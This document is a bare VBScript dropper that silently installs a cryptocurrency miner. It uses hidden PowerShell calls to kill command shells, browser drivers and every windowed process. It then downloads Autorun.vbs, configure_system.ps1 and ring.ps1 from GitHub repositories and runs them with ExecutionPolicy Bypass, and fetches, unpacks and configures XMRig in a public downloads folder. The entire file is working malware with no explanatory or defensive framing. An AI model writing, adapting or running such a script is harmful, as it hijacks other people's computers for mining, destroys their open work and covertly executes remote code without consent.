Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -Command Stop-Process -Name 'cmd','powershell','xmrig','chromedriver','msedgedriver' -Force -ErrorAction SilentlyContinue", 0, True
objShell.Run "powershell.exe -Command Get-Process | Where-Object { $_.MainWindowHandle -ne 0 } | Stop-Process -Force", 0, True
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/Salvium-SAL-/refs/heads/main/Autorun.vbs -OutFile C:\Users\Public\Downloads\Autorun.vbs", 0, True
WScript.Sleep 1000
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/Salvium-SAL-/refs/heads/main/configure_system.ps1 -OutFile C:\Users\Public\Downloads\configure_system.ps1", 0, True
WScript.Sleep 2000
objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\configure_system.ps1", 0, True
WScript.Sleep 10000
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/ring.ps1 -OutFile C:\Users\Public\Downloads\ring.ps1", 0, True
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip -OutFile C:\Users\Public\Downloads\xmrig-6.22.2-gcc-win64.zip", 0, True
objShell.Run "powershell.exe -Command Expand-Archive -Path 'C:\Users\Public\Downloads\xmrig-6.22.2-gcc-win64.zip' -DestinationPath 'C:\Users\Public\Downloads\' -Force", 0, True
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/Salvium-SAL-/refs/heads/main/COINRUN.cmd -OutFile C:\Users\Public\Downloads\COINRUN.cmd", 0, True
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/Salvium-SAL-/refs/heads/main/config.json -OutFile C:\Users\Public\Downloads\config.json", 0, True
WScript.Sleep 2000
objShell.Run "powershell.exe -Command Copy-Item -Path C:\Users\Public\Downloads\COINRUN.cmd -Destination C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd -Force", 0, True
objShell.Run "powershell.exe -Command Copy-Item -Path C:\Users\Public\Downloads\config.json -Destination C:\Users\Public\Downloads\xmrig-6.22.2\config.json -Force", 0, True
objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\ring.ps1", 0, True
objShell.Run "powershell.exe exit", 0, False
